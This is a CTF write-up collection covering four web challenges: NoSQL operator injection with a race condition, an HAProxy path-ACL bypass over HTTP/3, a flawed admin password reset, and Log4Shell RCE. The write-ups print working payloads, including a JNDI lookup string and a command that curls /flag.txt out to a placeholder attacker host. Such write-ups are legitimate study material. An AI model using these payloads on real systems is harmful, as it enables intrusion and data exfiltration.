# Focus. Speed. I am speed.
#race-condition #nosqli 
## Description
> Welcome to Radiator Springs' finest store, where every car enthusiast's dream comes true! But remember, in the world of racing, precision matters—so tread carefully as you navigate this high-octane experience. Ka-chow! 
> Website: [http://speed.challs.srdnlen.it:8082](http://speed.challs.srdnlen.it:8082) 
> Author: [@Octaviusss](https://github.com/Octaviusss)
## Overview
It's a simple shop that allows to buy some items and to redeem coupons. After the registration the user has 0 points in the balance.
## Road to flag
The goal is to reach 50 points in order to buy the flag.
## Code review
1. `app.js`
Upon app creation the products, and only one coupon is added in the database.

```js
async function App() {
    const app = express();
    //[...]
    const products = [
        { productId: 1, Name: "Lightning McQueen Toy", Description: "Ka-chow! This toy goes as fast as Lightning himself.", Cost: "Free" },
        { productId: 2, Name: "Mater's Tow Hook", Description: "Need a tow? Mater's here to save the day (with a little dirt on the side).", Cost: "1 Point" },
        { productId: 3, Name: "Doc Hudson's Racing Tires", Description: "They're not just any tires, they're Doc Hudson's tires. Vintage!", Cost: "2 Points" },
        { 
            productId: 4, 
            Name: "Lightning McQueen's Secret Text", 
            Description: "Unlock Lightning's secret racing message! Only the fastest get to know the hidden code.", 
            Cost: "50 Points", 
            FLAG: process.env.FLAG || 'SRDNLEN{fake_flag}' 
        }
    ];
    

    //[...]

    // Insert randomly generated Discount Codes if they don't exist
    const createDiscountCodes = async () => {
        const discountCodes = [{ discountCode: generateDiscountCode(), value: 20 }];
		// [...]
		await DiscountCodes.create(code);
		// [...]
    };

    // Call function to insert discount codes
    await createDiscountCodes();

    app.use('/', (req, res) => {
        res.status(404);
        if (req.accepts('html') || req.accepts('json')) {
            return res.render('notfound');
        }
    });

    return app;
}
```

1. `/redeem`
This route handles the redeem of a discount codes. It checks for a valid discount code, verifies it hasn't been used today by the user and adds the discount to the user's balance.

Two vulnerabilities can be identified in this code:

- No-SQL Injection in `const discount = await DiscountCodes.findOne({discountCode})`
	It is vulnerable to operator injection: by requesting `/redeem?discountCode[$ne]=x` the operator `$ne` is used in the query -> `DiscountCodes.findOne({ discountCode: { $ne: "" } });`
	permitting to **redeem any discount code** existing in the database.

- Race condition -> multiple requests can execute the **read-modify-write** sequence on the user's balance concurrently, permitting to **use the same discount code multiple times**. The delay `new Promise(resolve => setTimeout(resolve, delay * 1000));` exacerbates the race condition by increasing the window of time during which concurrent requests can interfere with each other.

```js
router.get('/redeem', isAuth, async (req, res) => {
    try {
        // [...]
        let { discountCode } = req.query;
        const discount = await DiscountCodes.findOne({discountCode})

        if (!discount)
            return res.render('error', { Authenticated: true, message: 'Invalid discount code!' });

        // Check if the voucher has already been redeemed today
        const today = new Date();
        const lastRedemption = user.lastVoucherRedemption;

        if (lastRedemption) {
            const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &&
                              lastRedemption.getMonth() === today.getMonth() &&
                              lastRedemption.getDate() === today.getDate();
            if (isSameDay) {
                return res.json({success: false, message: 'You have already redeemed your gift card today!' });
            }
        }

        // Apply the gift card value to the user's balance
        const { Balance } = await User.findById(req.user.userId).select('Balance');
        user.Balance = Balance + discount.value;
        // Introduce a slight delay to ensure proper logging of the transaction 
        // and prevent potential database write collisions in high-load scenarios.
        new Promise(resolve => setTimeout(resolve, delay * 1000));
        user.lastVoucherRedemption = today;
        await user.save();

        return res.json({
            success: true,
            message: 'Gift card redeemed successfully! New Balance: ' + user.Balance // Send success message
        });

    } catch (error) {
        console.error('Error during gift card redemption:', error);
        return res.render('error', { Authenticated: true, message: 'Error redeeming gift card'});
    }
});
```

## Exploitation
1. Exploit the NoSQLi + race condition in order to increase the balance:
    Make many concurrent requests to `/redeem?discountCode[$ne]=x` (i used burp's last-byte sync)
2. Buy the flag

`srdnlen{6peed_1s_My_0nly_Competition}`

---
# Average HTTP3 Enjoyer
#http3 #haproxy #access-control 
## Description
> HTTP/3 is just the best version of HTTP, wait a few years ~~, until setting up an HTTP/3 server will not be a pain,~~ and you’ll see. I hid a secret on /flag, you can only get it if you become a real HTTP/3 enjoyer.
> NOTE: This challenge uses only HTTP/3, browsers are a bit hesitant in using it by default, so you’ll have to use explicit arguments to do so.
> In chrome you can do the following: `chrome --enable-quic --origin-to-force-quic-on=enjoyer.challs.ctf.srdnlen.it`

## Code review
- the flag is returned by `/flag`
```python
@app.route('/flag')
def flag():
    return "srdnlen{f4k3_fl4g}"
```

- the app uses **haproxy** and **http3**
there's a rule that forbids the access to `/flag`, if `/flag` (case insensitive) is in the request url: `acl restricted_flag path_sub,url_dec -m sub -i i /flag`

```
[ . . . ]

frontend haproxy
  bind quic4@:443 ssl crt /etc/haproxy/certs/cert.crt alpn h3
  http-request redirect scheme https unless { ssl_fc }
  http-response set-header alt-svc "h3=\":443\";ma=900;"
  option httplog
  acl restricted_flag path_sub,url_dec -m sub -i i /flag
  http-request deny if restricted_flag

default_backend backend_server

backend backend_server
  balance roundrobin
  server backend_server backend-server:8080
```

## Exploitation
1. Haproxy acl rule bypass
In HTTP2 and 3 the `:path` pseudoheader is used to specify the request target.
To bypass the rule I can just set `:path: flag`

To send the request I used [aioquic](https://github.com/aiortc/aioquic):
`python http3client.py https://enjoyer.challs.ctf.srdnlen.it/ --output-dir . -i -H ':path: flag'`

- profit
`srdnlen{you_found_the_:path_for_becoming_a_real_http3_enjoyer}`

---


# Ben10
## Description
> Ben Tennyson's Omnitrix holds a mysterious and powerful form called Materia Grigia — a creature that only those with the sharpest minds can access. It's hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what’s truly hidden.
Can you outsmart the system and reveal the flag?
Website: [http://ben10.challs.srdnlen.it:8080](http://ben10.challs.srdnlen.it:8080)
Author: @gheddus
## Overview
It's a simple website that allows to authenticate and view some images.
## Road to flag
The flag is given for admin users that view the image `ben10`

```python
@app.route('/image/<image_id>')
def image(image_id):
    """Display the image if user is admin or redirect with missing permissions."""
    if 'username' not in session:
        return redirect(url_for('login'))

    username = session['username']

    if image_id == 'ben10' and not username.startswith('admin'):
        return redirect(url_for('missing_permissions'))

    flag = None
    if username.startswith('admin') and image_id == 'ben10':
        flag = FLAG

    return render_template('image_viewer.html', image_name=image_id, flag=flag)
```

## Code review
1. `/register` endpoint
For every user, an admin account is created. For example, when registering as `sebb`, an admin account `admin^sebb^bec9e48356` is created with a random password.
The admin account's username can be found in the `/home` page: `<div style="display:none;" id="admin_data">{{ admin_username }}</div>`

```python
@app.route('/register', methods=['GET', 'POST'])
def register():
    """Handle user registration."""
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        if username.startswith('admin') or '^' in username:
            flash("I don't like admins", "error")
            return render_template('register.html')

        if not username or not password:
            flash("Both fields are required.", "error")
            return render_template('register.html')

        admin_username = f"admin^{username}^{secrets.token_hex(5)}"
        admin_password = secrets.token_hex(8)

        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            cursor.execute("INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)",
                           (username, password, admin_username))
            cursor.execute("INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)",
                           (admin_username, admin_password, None))
            conn.commit()
        except sqlite3.IntegrityError:
            flash("Username already exists!", "error")
            return render_template('register.html')
        finally:
            conn.close()

        flash("Registration successful!", "success")
        return redirect(url_for('login'))

    return render_template('register.html')
```

1. `/reset_password`
Returns a token that can be used for resetting the password via `/forgot_password`

```python
@app.route('/reset_password', methods=['GET', 'POST'])
def reset_password():
    """Handle reset password request."""
    if request.method == 'POST':
        username = request.form['username']

        if username.startswith('admin'):
            flash("Admin users cannot request a reset token.", "error")
            return render_template('reset_password.html')

        if not get_user_by_username(username):
            flash("Username not found.", "error")
            return render_template('reset_password.html')

        reset_token = secrets.token_urlsafe(16)
        update_reset_token(username, reset_token)

        flash("Reset token generated!", "success")
        return render_template('reset_password.html', reset_token=reset_token)

    return render_template('reset_password.html')
```

1. `/forgot_password`
This code handles password resets. It retrieves the username, reset token, and new password from user input. For non-admin users, it verifies the reset token and updates the password if valid. For admin users, it extracts the non-admin username, verifies the token, and then updates the **admin** account's password.
This is clearly an authentication flaw.

```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    """Handle password reset."""
    if request.method == 'POST':
        username = request.form['username']
        reset_token = request.form['reset_token']
        new_password = request.form['new_password']
        confirm_password = request.form['confirm_password']

        if new_password != confirm_password:
            flash("Passwords do not match.", "error")
            return render_template('forgot_password.html', reset_token=reset_token)

        user = get_user_by_username(username)
        if not user:
            flash("User not found.", "error")
            return render_template('forgot_password.html', reset_token=reset_token)

        if not username.startswith('admin'):
            token = get_reset_token_for_user(username)
            if token and token[0] == reset_token:
                update_password(username, new_password)
                flash(f"Password reset successfully.", "success")
                return redirect(url_for('login'))
            else:
                flash("Invalid reset token for user.", "error")
        else:
            username = username.split('^')[1]
            token = get_reset_token_for_user(username)
            if token and token[0] == reset_token:
                update_password(request.form['username'], new_password)
                flash(f"Password reset successfully.", "success")
                return redirect(url_for('login'))
            else:
                flash("Invalid reset token for user.", "error")

    return render_template('forgot_password.html', reset_token=request.args.get('token'))
```

## Exploitation
1. Register an user and request a password reset
2. Reset the password using the admin username
3. Login as admin
4. Visit `/image/ben10`

`srdnlen{b3n_l0v3s_br0k3n_4cc355_c0ntr0l_vulns}`

# Sparkling Sky
#log4j 
## Description
> I am developing a game with websockets in python. I left my pc to a java fan, I think he really messed up.
> _It is forbidden to perform or attempt to perform any action against the infrastructure or the challenge itself._
- username: user1337
- password: user1337
- website: [http://sparklingsky.challs.srdnlen.it:8081](http://sparklingsky.challs.srdnlen.it:8081)
author: @sanmatte
## Overview
It's a simple game.
## Road to flag
The flag is in `/flag.txt` -> RCE
## Code review
1. `Dockerfile`
The app uses log4j 2.14.1, vulnerable to CVE-2021-44228

```
RUN cd $(python -c "import os, pyspark; print(os.path.dirname(pyspark.__file__))")/jars && \
    rm log4j* && \
    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar && \
    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar && \
    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-slf4j-impl/2.14.1/log4j-slf4j-impl-2.14.1.jar && \
    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-1.2-api/2.14.1/log4j-1.2-api-2.14.1.jar
```
1. `socket.py`
The games uses websockets for client-server communication.
Every move is analyzed by `analyze_movement` and 'fraudulent' moves are logged with **log4j**.
The $x$,$y$ coordinates and the *angle* of the move are included in the logs. $x$ and $y$ has to be **numbers** because `analyze_movement` uses them to compute the distance, instead **angle** can be a **string**.

```python
@socketio.on('move_bird')
    @login_required
    def handle_bird_movement(data):
        user_id = data.get('user_id')
        print(f"{user_id} moves")
        if user_id in players:
            # for p in players:
                # print(f"player: {p}")
            del data['user_id']
            if players[user_id] != data:
                with lock:
                    players[user_id] = {
                        'x': data['x'],
                        'y': data['y'],
                        'color': 'black',
                        'angle': data.get('angle', 0)
                    }
                    # print("data: " + str(data.get('angle', 0)))
                    if analyze_movement(user_id, data['x'], data['y'], data.get('angle', 0)):
                        log_action(user_id, f"was cheating with final position ({data['x']}, {data['y']}) and final angle: {data['angle']}")
                        # del players[user_id] # Remove the player from the game - we are in beta so idc
                    emit('update_bird_positions', players, broadcast=True)
```
1. `anticheat.py`
Decides if a move is valid or not relying on the distance and time between the moves.

```python
logger = spark._jvm.org.apache.log4j.LogManager.getLogger("Anticheat")

def log_action(user_id, action):
    logger.info(f"User: {user_id} - {action}")

def analyze_movement(user_id, new_x, new_y, new_angle):
    global user_states
    # Initialize user state if not present
    if user_id not in user_states:
        user_states[user_id] = {
            'last_x': new_x,
            'last_y': new_y,
            'last_time': time.time(),
            'violations': 0,
        }

    user_state = user_states[user_id]
    last_x = user_state['last_x']
    last_y = user_state['last_y']
    last_time = user_state['last_time']

    # Calculate distance and time elapsed
    distance = math.sqrt((new_x - last_x)**2 + (new_y - last_y)**2)
    time_elapsed = time.time() - last_time
    speed = distance / time_elapsed if time_elapsed > 0 else 0

    # Check for speed violations
    if speed > MAX_SPEED:
        return True

    # Update the user state
    user_states[user_id].update({
        'last_x': new_x,
        'last_y': new_y,
        'last_time': time.time(),
    })

    return False
```

## Exploitation
1. Login
2. log4j RCE
To achieve RCE I have just to make the application log a malicious message, by making an invalid move that will be logged by the `move_bird` websocket handler.
I can insert the log4shell payload in the **angle** parameter that will be logged triggering the RCE.
To make the invalid move i can just paste this code in the web console of the page:

```js
socket.emit('move_bird', {user_id: 1, x:1, y:1, angle:0});
socket.emit('move_bird', {user_id: 1, x:999999999999999, y:999999999999999, angle:'${jndi:ldap://ATTACKER:1389/ftbqdx}'});
```

An JNDI/LDAP server is required for the exploitation of CVE-2021-44228, i used [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)
`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "curl -F x=@/flag.txt https://ATTACKER.com/" -A "ATTACKER"`

- Profit
`srdnlen{I_th1nk_h3_r34lly_m3ss3d_up}`